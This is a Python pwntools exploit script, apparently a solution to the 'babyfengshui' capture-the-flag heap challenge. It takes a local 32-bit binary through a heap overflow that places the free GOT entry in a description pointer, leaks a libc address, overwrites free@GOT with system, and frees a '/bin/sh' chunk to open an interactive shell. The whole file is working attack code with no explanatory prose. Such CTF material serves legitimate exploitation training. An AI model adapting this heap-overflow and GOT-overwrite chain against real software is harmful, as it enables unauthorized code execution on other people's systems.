#!/usr/bin/python 
from pwn import *

context.log_level = 'debug'
p = process("./babyfengshui")
gdb.attach(p)
elf = ELF("./babyfengshui")
#libc = ELF("/lib/i386-linux-gnu/libc-2.23.so")
libc = elf.libc
free_got = elf.got['free']
binsh = "/bin/sh\x00"

def add(size, name, length, desc):
    p.sendlineafter("Action: ", '0')
    p.sendlineafter("size of description: ", str(size))
    p.sendlineafter("name: ", name)
    p.sendlineafter("text length: ", str(length))
    p.sendlineafter("text: ", desc)

def delete(index):
    p.sendlineafter("Action: ", '1')
    p.sendlineafter("index: ", str(index))

def display(index):
    p.sendlineafter("Action: ", '2')
    p.sendlineafter("index: ", str(index))

def update(index, length, desc):
    p.sendlineafter("Action: ", '3')
    p.sendlineafter("index: ", str(index))
    p.sendlineafter("text length: ", str(length))
    p.sendlineafter("text: ", desc)

add(10, 'A'*10, 10, 'B'*10)
add(10, 'C'*10, 10, 'D'*10)
add(10, 'E'*10, len(binsh), binsh)

# 0 chunk -> unsorted bin
delete(0)

# heap overflow
pay = 'B'*152+p32(free_got)
add(120, 'A'*120, len(str(pay)), pay)

# libc leak
display(1)
p.recvuntil("description: ")
free = u32(p.recv(4))
libcBase = free - libc.symbols['free']
system = libcBase + 0x3ada0
log.info("free : "+hex(free))
log.info("libcBase : "+hex(libcBase))
log.info("system : "+hex(system))

#gdb.attach(p)
# GOT overwrite : free#got <- system 
update(1, 4, p32(system))

# system("/bin/sh")
delete(2)

p.interactive()

